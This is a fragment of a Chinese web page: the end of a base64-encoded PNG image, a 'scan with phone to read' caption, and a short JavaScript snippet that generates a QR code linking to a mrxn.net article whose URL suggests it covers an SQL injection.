hzmaX2HNqNKHzJF/B2HeW/P35UxIXg9G3nWIDyM6r+fl+iLc+683xLvyJnhYCNy3BWyX6XZFYPrbtq1hcWB/t7sO4/yen3FniGY6Vxdhfq5Vn3pH56l3Dufnqb7DQhxy4WvuwOFTlpdR26qSizBuGcIrOyv79GCeh+gQNC865wwhvRDsWWfB6KuL9kFyMOLKX+mQ/j5/lr/eEO/Km+D2Kcvtiavr0xfNQZ4CeUeIv+pTF+2H9MlFczPsGRhn2APRYUT7RfNi1zs3J+p31N/j9Yb0u/Rivv0MgfEpgXPude+3W8eQvmd9c48QxrnmITqgdMC6rioNYPiEqF6Zqs4heQjqrxDmORh1CIc7Xm/I6q6+SN8WUk/GM/XoOp0B960DW5v+JnwdAJ9PLQS/5A1WfeqFW/jrAOazvuwlwNhXs6tsgPgQVBcrWyUXS6vqvDRrW4ihC197Bw4LgWwdRlxdJpzn3Dwkt5pjbuXD2A/hcMTVDPV+LjlkljkIh6D6CiE5GLHnYe0fFtKbL/67d+DHFtKfshXv35459e9y+/bYZ8D4REJ4zzlDXVQXu/6I2yeaFyHXA1z/9/vtzb5+7A2BbLlvXd6/b0gegvow532OfI99xt6bHcN4rt4vF50B6Vtx82LPqUPmyAt/bCE17Kr/fwcOC3GbHVenWuXU4fgU1Cz9Op4VjH0QDsFZj5qzIVmYo3mIb5+6qA7JqcOcQ3T7zHec+YeF9KaL/+4d2BYC2Sqc4+ryYN7X85Bc1zufPT37DBzn2APx5Pu+2XHPySFzINh7zanLRfWOkHkQ3PvbQvbidfy6O3At5HX3fnrm/wAAAP//ptUsawAAAAZJREFUAwCSDkndcmw1bgAAAABJRU5ErkJggg==)

手机扫码阅读

编程


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-dopageduoproductsinfo-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 